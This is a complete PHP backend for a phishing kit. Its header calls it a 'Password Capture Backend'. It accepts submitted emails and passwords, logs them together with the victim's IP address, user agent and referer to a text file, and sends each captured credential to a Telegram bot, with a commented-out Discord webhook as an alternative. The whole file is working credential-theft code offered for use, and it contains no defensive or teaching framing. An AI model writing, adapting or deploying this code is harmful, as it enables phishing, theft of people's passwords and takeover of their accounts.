<?php
// capture.php - Password Capture Backend

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Configuration
$log_file = 'captured_passwords.txt';
$telegram_bot_token = 'YOUR_BOT_TOKEN_HERE'; // Optional: Telegram notification
$telegram_chat_id = 'YOUR_CHAT_ID_HERE';

// Get POST data
$data = json_decode(file_get_contents('php://input'), true);

if ($data && isset($data['email']) && isset($data['password'])) {
    $email = $data['email'];
    $password = $data['password'];
    $timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
    
    // Get victim info
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    
    // Format log entry
    $log_entry = "
========================================
Timestamp: $timestamp
Email: $email
Password: $password
IP Address: $ip
User Agent: $user_agent
Referer: $referer
========================================

";
    
    // Save to file
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Optional: Send to Telegram
    if ($telegram_bot_token && $telegram_chat_id) {
        $message = "🎯 New Credential Captured!\n\n";
        $message .= "📧 Email: $email\n";
        $message .= "🔑 Password: $password\n";
        $message .= "🌐 IP: $ip\n";
        $message .= "⏰ Time: $timestamp";
        
        $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
        $telegram_data = [
            'chat_id' => $telegram_chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($telegram_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Optional: Send to Discord Webhook
    // $discord_webhook = 'YOUR_DISCORD_WEBHOOK_HERE';
    // if ($discord_webhook) {
    //     $discord_message = [
    //         'content' => "**New Credential Captured!**\n📧 Email: `$email`\n🔑 Password: `$password`\n🌐 IP: `$ip`"
    //     ];
    //     
    //     $ch = curl_init($discord_webhook);
    //     curl_setopt($ch, CURLOPT_POST, 1);
    //     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discord_message));
    //     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //     curl_exec($ch);
    //     curl_close($ch);
    // }
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
}
?>
